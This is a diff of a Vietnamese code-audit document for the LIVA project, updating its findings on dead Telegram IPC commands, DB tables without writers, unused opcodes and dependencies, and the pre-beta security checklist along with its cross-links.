+**(d) Telegram: 3 lệnh ghi ra stdout mà không ai đọc.** `telegram.rs:384` gửi `{"command":"telegram:message", …}`, `telegram.rs:124` gửi `{"command":"panic"}`, `telegram.rs:164-172` gửi `"voice:tts_stop"` — nhưng `ipc_tx` chính là kênh **ghi ra stdout** (`liva-native-core/src/boot.rs:401-428` → writer task `liva-native-core/src/boot.rs:401-428`). Không có vòng lặp back nào. Hơn nữa `handle_command` **không có arm `"telegram:message"`** (grep toàn repo: chỉ `telegram.rs:384`) và **không có arm `"panic"`**. ⇒ `/ask`, `/panic`, tin nhắn text Telegram: bot nhận, ghi 1 dòng JSON ra stdout, hết. Không tiến trình cha nào tồn tại (`scripts/start_all.ps1` không khởi động binary `liva-native-core`).
 
 ### 5.5 Bảng DB tạo ra nhưng không có writer
 
@@ -753,7 +604,7 @@ Quét `INSERT/UPDATE/DELETE/FROM` trên `src/` sau projection consumer: **6 bả
 
 `get_memory_data` nay có thể trả `events`/`vectors`; phần L0 từ `turn_layer_nodes` và L3 vẫn rỗng. `/latest` còn phụ thuộc nguồn `turn_layer_nodes`, nên chưa được event-ledger sửa.
 
-> 📌 Nguồn đầy đủ (ERD, 15 bảng, kiểm đếm writer/reader từng bảng): [Tầng dữ liệu và bảo mật](../01-ban-ve/07-tang-du-lieu-va-bao-mat.md)
+> 📌 Nguồn đầy đủ (ERD, 20 bảng, kiểm đếm production writer): [Persistence runtime](../03-he-thong-con/persistence.md)
 
 ### 5.6 Danh sách TODO / FIXME / `unimplemented!`
 
@@ -773,7 +624,7 @@ Grep `TODO|FIXME|unimplemented!|todo!()|XXX|HACK` trên toàn `src/` (`--include
 
 ### 5.7 Hằng số / opcode / dependency chết
 
-- `webrtc/frame.rs:10` `pub const OP_ACK_PLAYING: u8 = 0x04;` — grep toàn repo (`.rs/.ts/.vue/.py`, trừ `target/`): **0 tham chiếu ngoài dòng khai báo**. Server rơi vào `_ => {}` (`main.rs:791`). Nay đã có comment `frame.rs:7-9` ghi rõ đây là **chỗ đặt trước trong hợp đồng wire**, không phải sót — nên vấn đề còn lại chỉ là "quyết định dứt điểm", xem L5.
+- `webrtc/frame.rs:10` `pub const OP_ACK_PLAYING: u8 = 0x04;` — grep toàn repo (`.rs/.ts/.vue/.py`, trừ `target/`): **0 tham chiếu ngoài dòng khai báo**. Server rơi vào `_ => {}` (`liva-native-core/src/websocket.rs:825`). Nay đã có comment `frame.rs:7-9` ghi rõ đây là **chỗ đặt trước trong hợp đồng wire**, không phải sót — nên vấn đề còn lại chỉ là "quyết định dứt điểm", xem L5.
 - `webrtc/frame.rs:6` `OP_FLUSH` thì ngược lại: **server gửi** (`pipeline.rs:462`), **client xử lý** (`liva-ui/src/App.vue:160`, `liva-ui/src/WidgetApp.vue:697`) → sống.
 - ~~`Cargo.toml:26` `webrtc = "0.12.0"`~~ — **đã gỡ 22/07/2026** (commit `510c9e2`): dep này không có một lời gọi API nào; gỡ nó kéo theo 45 crate khỏi cây phụ thuộc. `grep "^webrtc" liva-native-core/Cargo.toml` nay = 0 hit. Toàn bộ "WebRTC" của LIVA là WebSocket nhị phân tự chế.
 - `mcp/protocol.rs:5` `JsonRpcRequest { id: String }` ép `id` phải là chuỗi; JSON-RPC 2.0 cho phép number/null ⇒ nếu có ngày nối transport thật thì client chuẩn gửi `"id": 1` sẽ fail deserialize. (Chưa gây lỗi vì chưa có transport.)
@@ -869,15 +720,20 @@ godComponent     = file .ts có lineCount > 1200   (audit_profiler.ts:147)
 
 ---
 
-## 7. Ba việc nên làm trước khi phát hành cho beta tester
+## 7. Ba việc phải làm trước khi phát hành beta rộng
 
-1. **C1 + C2** — vá WebSocket (Origin + token) và validate `model_path`. Đây là hai lỗ hổng có thể khai thác từ xa qua trình duyệt, không cần người dùng làm gì sai.
-2. **H3 + H6** — cắt cửa sổ lịch sử + thêm `user_version` migration. Cả hai đều là lỗi **chắc chắn** sẽ nổ sau vài ngày dùng thật, và H6 càng để lâu càng khó sửa.
-3. **H7** — hoặc nối dây bộ nhớ dài hạn, hoặc sửa mọi tài liệu/hồ sơ để không tuyên bố "H-MEM 3 tầng" như tính năng đã kiểm chứng.
+1. ~~**A31-01 — làm sạch supply chain.**~~ **Đã khép 31/07/2026**; phần biến audit thành gate
+   được theo dõi riêng ở A31-03.
+2. ~~**A31-02 — khép security acceptance gate.**~~ **Đã khép 31/07/2026:** ADR-001, mã hóa
+   transcript/checkpoint, CSP self-only và recovery drill cùng manifest key-ID đều có test.
+3. ~~**A31-03 — bật format/audit gate.**~~ **Đã khép 31/07/2026.** A31-05 vẫn là
+   quy tắc delivery: chia working tree thành lát nhỏ, chạy acceptance command và
+   GitNexus change detection cho từng lát.
 
-Ba việc này là nội dung của **Giai đoạn 0** trong lộ trình; thứ tự thi hành, ước lượng công sức và hướng dẫn sửa từng bước (F1–F5) nằm ở tài liệu kế tiếp.
-
-> 📌 Nguồn đầy đủ: [Lộ trình sửa lỗi và nâng cấp](03-lo-trinh-sua-loi-va-nang-cap.md)
+Các mục C1/C2/H3/H6/H7 từng đứng ở đây đã được vá hoặc hạ mức trong hồ sơ lịch sử; không tiếp tục
+đưa chúng lên đầu chỉ vì phần mô tả cũ còn dài. Backlog thi hành hiện hành nằm ở
+[Nâng cấp toàn diện](05-nang-cap-toan-dien.md), còn security gate chuẩn nằm ở
+[Threat model](../05-chat-luong/threat-model.md#9-security-acceptance-gate-cho-beta).
 
 ---
 
@@ -888,9 +744,9 @@ Ba việc này là nội dung của **Giai đoạn 0** trong lộ trình; thứ 
 **Tài liệu này dựa vào (nguồn sự thật ở nơi khác):**
 
 - [Kiến trúc tổng thể](../01-ban-ve/01-kien-truc-tong-the.md) — bảng so sánh hai profile chạy, làm nền cho M4
-- [Giao thức IPC và WebSocket](../01-ban-ve/02-giao-thuc-ipc-va-websocket.md) — bảng 42 lệnh `handle_command`, khung 9 byte, bảng opcode (C1, §5.4, §5.7)
+- [Giao thức IPC và WebSocket](../01-ban-ve/02-giao-thuc-ipc-va-websocket.md) — catalog lệnh `handle_command` theo miền, khung 9 byte, bảng opcode (C1, §5.4, §5.7)
 - [Hệ LLM và prompt](../01-ban-ve/04-he-llm-va-prompt.md) — cấu hình LLM, `n_ctx`, cách dựng prompt (H3)
-- [Tầng dữ liệu và bảo mật](../01-ban-ve/07-tang-du-lieu-va-bao-mat.md) — ERD, 15 bảng, kiểm đếm writer, sơ đồ mã hoá (C3, H5, H6, §5.5)
+- [Persistence runtime](../03-he-thong-con/persistence.md) và [Threat model](../05-chat-luong/threat-model.md) — schema v5, writer ownership, durability và hardening hiện hành
 - [Phụ thuộc module và tra cứu file](../01-ban-ve/10-phu-thuoc-module-va-tra-cuu.md) — LOC từng module và sơ đồ phụ thuộc, đối chiếu với §5
 - [Cấu hình và biến môi trường](../02-van-hanh/01-cau-hinh-va-bien-moi-truong.md) — bảng biến `LIVA_*` và lệch `.env.example` (§5.8, M5, L11)
 - [Mô hình AI và tài nguyên](../02-van-hanh/02-mo-hinh-ai-va-tai-nguyen.md) — bảng model, RAM/VRAM, feature `cuda/vulkan/openblas` (C2, §5.8)
@@ -902,7 +758,7 @@ Ba việc này là nội dung của **Giai đoạn 0** trong lộ trình; thứ 
 - [Lộ trình sửa lỗi và nâng cấp](03-lo-trinh-sua-loi-va-nang-cap.md) — lấy mã định danh rủi ro (C1–C3, H1–H7, M1–M9, L1–L12) làm đầu vào xếp ưu tiên 5 giai đoạn
 - [Đối chiếu tuyên bố và thực tế](01-doi-chieu-tuyen-bo-vs-thuc-te.md) — lấy bằng chứng code mồ côi (§5) để chứng minh claim nào chưa kiểm chứng được
 - [Phụ thuộc module và tra cứu file](../01-ban-ve/10-phu-thuoc-module-va-tra-cuu.md) — lấy danh sách 6 thành phần mồ côi từ §5.1/§5.2
-- [Tầng dữ liệu và bảo mật](../01-ban-ve/07-tang-du-lieu-va-bao-mat.md) — lấy kết luận fail-open của `decrypt()` và hệ quả bảng không writer
+- [Threat model](../05-chat-luong/threat-model.md) — `try_decrypt` hiện fail-closed; [Persistence runtime](../03-he-thong-con/persistence.md) sở hữu danh mục bảng không writer
 
 **Khi sửa code sau đây thì phải cập nhật tài liệu này:**
 
